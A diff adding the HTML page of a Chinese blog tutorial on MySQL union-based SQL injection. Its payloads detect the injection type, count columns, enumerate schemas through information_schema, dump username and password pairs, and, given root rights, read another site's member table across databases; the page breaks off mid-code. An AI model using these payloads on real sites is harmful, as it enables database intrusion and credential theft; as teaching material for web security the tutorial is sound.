@@ -1,0 +1,442 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入基础 — MySQL注入入门到文件读写 | 江小白</title><meta name="author" content="江小白"><meta name="copyright" content="江小白"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PHP-MySQL-Web 组成架构服务器安装 MySQL 数据库，搭建多个站点，数据库集中存储管理。可以用 root 用户统一管理，也可以为每个网站创建独立的数据库用户。 统一 root 用户管理12www.zblog.com → zblog → root → MySQLwww.demo01.com → demo01 → root → MySQL  一对一用户管理（推荐）12www.zblog.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入基础 — MySQL注入入门到文件读写">
+<meta property="og:url" content="https://yh8567.github.io/2026/05/17/mysql-injection-basics/index.html">
+<meta property="og:site_name" content="江小白">
+<meta property="og:description" content="PHP-MySQL-Web 组成架构服务器安装 MySQL 数据库，搭建多个站点，数据库集中存储管理。可以用 root 用户统一管理，也可以为每个网站创建独立的数据库用户。 统一 root 用户管理12www.zblog.com → zblog → root → MySQLwww.demo01.com → demo01 → root → MySQL  一对一用户管理（推荐）12www.zblog.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yh8567.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2026-05-17T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-17T14:51:01.426Z">
+<meta property="article:author" content="江小白">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="Union查询">
+<meta property="article:tag" content="文件读写">
+<meta property="article:tag" content="跨库查询">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yh8567.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL注入基础 — MySQL注入入门到文件读写",
+  "url": "https://yh8567.github.io/2026/05/17/mysql-injection-basics/",
+  "image": "https://yh8567.github.io/img/avatar.jpg",
+  "datePublished": "2026-05-17T04:00:00.000Z",
+  "dateModified": "2026-05-17T14:51:01.426Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "江小白",
+      "url": "https://yh8567.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yh8567.github.io/2026/05/17/mysql-injection-basics/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入基础 — MySQL注入入门到文件读写',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+#loading-box #loading {
+  position: fixed; top: 0; right: 0; bottom: 0; left: 0;
+  z-index: 9999; background-color: #1a1a2e; display: block;
+}
+#loading-box.loaded #loading { display: none; }
+.cat { position: relative; display: block; width: 15em; height: 100%; font-size: 10px; margin: auto; }
+.cat * { box-sizing: content-box; }
+.cat .head, .cat .foot, .cat .body, .cat .paw {
+  position: absolute; top: 0; right: 0; bottom: 0; left: 0; margin: auto;
+  border-radius: 50%; width: 15em; height: 15em;
+}
+.cat .body {
+  background-image: radial-gradient(transparent 0%, transparent 35%, #383c4b 35%, #383c4b 39%, #eda65d 39%, #eda65d 46%, #f2c089 46%, #f2c089 60%, #eda65d 60%, #eda65d 67%, #383c4b 67%, #383c4b 100%);
+}
+.cat .head:before, .cat .foot:before {
+  background-image: radial-gradient(transparent 0%, transparent 35%, #383c4b 35%, #383c4b 39%, #eda65d 39%, #eda65d 67%, #383c4b 67%, #383c4b 100%);
+}
+.cat .head:before {
+  content: ''; width: 100%; height: 100%; position: absolute; border-radius: 50%;
+  clip-path: polygon(100% 20%, 50% 50%, 70% -10%);
+  -webkit-clip-path: polygon(100% 20%, 50% 50%, 70% -10%);
+}
+.cat .head:after {
+  content: ''; width: 4.125em; height: 2.5em; position: absolute;
+  top: 0.8125em; right: 3.9375em;
+  background-image: linear-gradient(#1a1a2e 65%, transparent 65%), radial-gradient(#1a1a2e 51%, #383c4b 55%, #383c4b 68%, transparent 70%);
+  transform: rotate(-66deg);
+}
+.cat .head .face {
+  width: 5em; height: 3.75em; left: 9.0625em; top: 1.8125em; position: absolute; transform: rotate(-47deg);
+  background-image: radial-gradient(circle, #1a1a2e 0%, #1a1a2e 1.25em, transparent 1.25em, transparent 100%),
+    radial-gradient(circle, #383c4b 0%, #383c4b 0.875em, transparent 0.875em, transparent 1.25em, #1a1a2e 1.25em, #1a1a2e 1.375em, transparent 1.375em),
+    radial-gradient(circle, #383c4b 0%, #383c4b 0.875em, transparent 0.875em, transparent 1.25em, #1a1a2e 1.25em, #1a1a2e 1.375em, transparent 1.375em);
+  background-size: 3.75em 6.25em, 1.875em 1.875em, 1.875em 1.875em;
+  background-position: 0.625em -2.5em, 0.625em 2.5em, 2.25em 1.875em;
+  background-repeat: no-repeat;
+}
+.cat .foot:before, .cat .foot:after { content: ''; width: 100%; height: 100%; position: absolute; }
+.cat .foot:before {
+  border-radius: 50%;
+  clip-path: polygon(50% 50%, 0% 50%, 0% 25%);
+  -webkit-clip-path: polygon(50% 50%, 0% 50%, 0% 25%);
+}
+.cat .foot .tummy-end { width: 1.5em; height: 1.5em; position: absolute; border-radius: 50%; background-color: #f2c089; left: 1.1875em; top: 6.5625em; }
+.cat .foot .bottom { width: 2.1875em; height: 0.9375em; position: absolute; top: 4.875em; left: 0.75em; border: 0.375em solid #383c4b; border-bottom: 0; border-radius: 50%; transform: rotate(21deg); background: #eda65d; }
+.cat .hands, .cat .legs, .cat .foot:after { width: 0.625em; height: 1.5625em; position: absolute; border: 0.375em solid #383c4b; background-color: #eda65d; }
+.cat .hands { border-top: 0; border-radius: 0 0 0.75em 0.75em; }
+.cat .hands.left { top: 4.3em; left: 13.1875em; transform: rotate(-20deg); }
+.cat .hands.right { top: 5.125em; left: 10.975em; transform: rotate(-25deg); }
+.cat .legs { border-bottom: 0; border-radius: 0.75em 0.75em 0 0; }
+.cat .legs.left { top: 4.0625em; left: 3.125em; transform: rotate(25deg); }
+.cat .legs.right { top: 3.3125em; left: 0.75em; transform: rotate(22deg); }
+.cat .foot:after { width: .9em; height: 2.5em; top: 2.625em; left: 2.5em; z-index: -1; transform: rotate(25deg); background-color: #c6823b; border-bottom: 0; border-radius: 0.75em 0.75em 0 0; }
+.cat { animation: 2.74s linear infinite loading-cat; }
+.cat .body { animation: 2.74s linear infinite body; }
+.cat .foot { animation: 2.74s linear infinite foot; }
+.cat:hover, .cat:hover .body, .cat:hover .foot { animation-play-state: paused; }
+.cat:active, .cat:active .body, .cat:active .foot { animation-play-state: running; }
+@keyframes body {
+  0% { clip-path: polygon(50% 50%, 0% 50%, 0% 100%, 100% 100%, 100% 20%); }
+  10% { clip-path: polygon(50% 50%, 30% 120%, 50% 100%, 100% 100%, 100% 20%); }
+  20% { clip-path: polygon(50% 50%, 100% 90%, 120% 90%, 100% 100%, 100% 20%); }
+  40% { clip-path: polygon(50% 50%, 100% 45%, 120% 45%, 120% 50%, 100% 20%); }
+  50% { clip-path: polygon(50% 50%, 100% 45%, 120% 45%, 120% 50%, 100% 20%); }
+  65% { clip-path: polygon(50% 50%, 100% 65%, 120% 65%, 120% 50%, 100% 20%); }
+  80% { clip-path: polygon(50% 50%, 75% 130%, 120% 65%, 120% 50%, 100% 20%); }
+  90% { clip-path: polygon(50% 50%, -20% 110%, 50% 120%, 100% 100%, 100% 20%); }
+  100% { clip-path: polygon(50% 50%, 0% 50%, 0% 100%, 100% 100%, 100% 20%); }
+}
+@keyframes loading-cat {
+  0% { transform: rotate(0deg); }
+  10% { transform: rotate(-80deg); }
+  20% { transform: rotate(-180deg); }
+  40% { transform: rotate(-245deg); }
+  50% { transform: rotate(-250deg); }
+  68% { transform: rotate(-300deg); }
+  90% { transform: rotate(-560deg); }
+  100% { transform: rotate(-720deg); }
+}
+@keyframes foot {
+  0% { transform: rotate(-10deg); }
+  10% { transform: rotate(-100deg); }
+  20% { transform: rotate(-145deg); }
+  35% { transform: rotate(-190deg); }
+  50% { transform: rotate(-195deg); }
+  70% { transform: rotate(-165deg); }
+  100% { transform: rotate(-10deg); }
+}
+/* Random day/night backgrounds via JS */
+#web_bg { display: none; }
+/* Day/night banner switching */
+html[data-theme="light"] #page-header {
+  background-image: url('/img/白天banner.png') !important;
+}
+html[data-theme="dark"] #page-header {
+  background-image: url('/img/夜晚banner.png') !important;
+}
+/* Remove card/footer borders, hide footer */
+.card-widget, .recent-post-item, #page-header {
+  border: none !important; box-shadow: none !important;
+}
+#footer { display: none !important; }
+/* Immersive mode button - mini cat */
+#immersive-btn {
+  position: fixed; bottom: 90px; right: 24px; z-index: 9999;
+  width: 48px; height: 48px; border-radius: 50%;
+  border: 2px solid rgba(255,255,255,.4);
+  background: rgba(10,10,20,.7); cursor: pointer;
+  backdrop-filter: blur(8px); overflow: hidden;
+  box-shadow: 0 0 16px rgba(0,0,0,.5);
+  transition: transform .3s, box-shadow .3s;
+}
+#immersive-btn:hover { transform: scale(1.1); box-shadow: 0 0 24px rgba(0,198,255,.3); }
+#immersive-btn .mini-cat {
+  width: 100%; height: 100%; position: relative;
+}
+#immersive-btn .mini-cat .mini-body {
+  position: absolute; inset: 6px; border-radius: 50%;
+  background-image: radial-gradient(transparent 0%, transparent 30%, #383c4b 30%, #383c4b 34%, #eda65d 34%, #eda65d 44%, #f2c089 44%, #f2c089 58%, #eda65d 58%, #eda65d 65%, #383c4b 65%, #383c4b 100%);
+  animation: 12s linear infinite loading-cat;
+}
+body.immersive #page-header,
+body.immersive #nav,
+body.immersive #content-inner,
+body.immersive #footer,
+body.immersive #rightside { display: none !important; }
+</style>
+</style>
+<meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  window.addEventListener('load', () => {
+    setTimeout(preloader.endLoading, 800)
+  })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => {
+      setTimeout(preloader.endLoading, 800)
+    }, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">江小白</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入基础 — MySQL注入入门到文件读写</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入基础 — MySQL注入入门到文件读写</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-17T04:00:00.000Z" title="发表于 2026-05-17 12:00:00">2026-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-17T14:51:01.426Z" title="更新于 2026-05-17 22:51:01">2026-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="PHP-MySQL-Web-组成架构"><a href="#PHP-MySQL-Web-组成架构" class="headerlink" title="PHP-MySQL-Web 组成架构"></a>PHP-MySQL-Web 组成架构</h2><p>服务器安装 MySQL 数据库，搭建多个站点，数据库集中存储管理。可以用 root 用户统一管理，也可以为每个网站创建独立的数据库用户。</p>
+<h3 id="统一-root-用户管理"><a href="#统一-root-用户管理" class="headerlink" title="统一 root 用户管理"></a>统一 root 用户管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.zblog.com → zblog → root → MySQL</span><br><span class="line">www.demo01.com → demo01 → root → MySQL</span><br></pre></td></tr></table></figure>
+
+<h3 id="一对一用户管理（推荐）"><a href="#一对一用户管理（推荐）" class="headerlink" title="一对一用户管理（推荐）"></a>一对一用户管理（推荐）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.zblog.com → zblog → zblog → MySQL</span><br><span class="line">www.demo01.com → demo01 → demo01 → MySQL</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SQL-注入步骤"><a href="#SQL-注入步骤" class="headerlink" title="SQL 注入步骤"></a>SQL 注入步骤</h2><h3 id="1-判断注入类型：数字型还是字符型"><a href="#1-判断注入类型：数字型还是字符型" class="headerlink" title="1. 判断注入类型：数字型还是字符型"></a>1. 判断注入类型：数字型还是字符型</h3><p>数字型的变量在 SQL 拼接时不用引号，字符型用引号：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 数字型</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> $id;</span><br><span class="line"># 字符型</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试数字型：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>数字型注入中，第一条返回 user_id&#x3D;1 的结果，第二条 and 1&#x3D;2 不成立，结果为空。</p>
+<p><strong>测试字符型：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>字符型注入中，第一条引号闭合，逻辑成立，回显数据；第二条逻辑不成立，返回空。如果直接报 SQL 语法错误，那就是数字型。</p>
+<h3 id="2-猜解字段数"><a href="#2-猜解字段数" class="headerlink" title="2. 猜解字段数"></a>2. 猜解字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 order by 1#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 order by 3#  -- 报错说明只有2个字段</span></span><br></pre></td></tr></table></figure>
+
+<p>或者用 Union：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select 1,2,3#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-获取当前数据库信息"><a href="#3-获取当前数据库信息" class="headerlink" title="3. 获取当前数据库信息"></a>3. 获取当前数据库信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, database(), user() #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, version(), @<span class="variable">@version_compile_os</span> #</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a><img src="/images/sql-injection/1730677901953-2a080083-bdda-4455-be8d-76ad66aef574.png" alt="联合查询获取数据库名"></h3><h3 id="4-获取数据库中的表"><a href="#4-获取数据库中的表" class="headerlink" title="4. 获取数据库中的表"></a>4. 获取数据库中的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>
+
+<p><code>information_schema.tables</code> 记录了数据库中所有表的信息，指定 <code>table_schema</code> 即可查询对应数据库的表。</p>
+<h3 id="5-获取表中的字段名"><a href="#5-获取表中的字段名" class="headerlink" title="5. 获取表中的字段名"></a>5. 获取表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+
+<p><code>information_schema.columns</code> 存储了表中列的信息。</p>
+<h3 id="6-获取数据"><a href="#6-获取数据" class="headerlink" title="6. 获取数据"></a>6. 获取数据</h3><p><img src="/images/sql-injection/1730678442989-5db6d6b6-5981-465d-8950-bf86e6d120af.png" alt="联合查询获取表数据"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, group_concat(username, &#x27;</span>:<span class="string">&#x27;, password) from users #</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="常用信息获取函数"><a href="#常用信息获取函数" class="headerlink" title="常用信息获取函数"></a>常用信息获取函数</h2><table>
+<thead>
+<tr>
+<th>信息</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据库版本</td>
+<td><code>version()</code></td>
+</tr>
+<tr>
+<td>数据库用户</td>
+<td><code>user()</code></td>
+</tr>
+<tr>
+<td>操作系统</td>
+<td><code>@@version_compile_os</code></td>
+</tr>
+<tr>
+<td>当前数据库名</td>
+<td><code>database()</code></td>
+</tr>
+</tbody></table>
+<p><strong>MySQL 5.0 以上</strong> 自带 <code>information_schema</code> 数据库：</p>
+<ul>
+<li><code>information_schema.schemata</code> — 所有数据库名 (<code>schema_name</code>)</li>
+<li><code>information_schema.tables</code> — 所有表名 (<code>table_name</code>, <code>table_schema</code>)</li>
+<li><code>information_schema.columns</code> — 所有列名 (<code>column_name</code>)</li>
+</ul>
+<p>完整注入示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 爆字段数</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 测试回显位置</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆数据库名和用户</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="keyword">user</span>(),<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆版本和操作系统</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version(),@<span class="variable">@version_compile_os</span>,<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆表名</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(table_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;demo01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆列名</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(column_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆数据</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,password,<span class="number">6</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p><strong>前提条件：</strong> 当前数据库为 ROOT 用户权限。</p>
+<p>通过一个网站的注入点获取另一个网站的账号密码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取所有数据库名</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(schema_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 跨库查 zblog 的表</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(table_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;zblog&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 跨库查 zblog 的 zbp_member 表的列</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,group_concat(column_name),<span class="number">6</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;zbp_member&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;zblog&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 跨库获取数据</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span 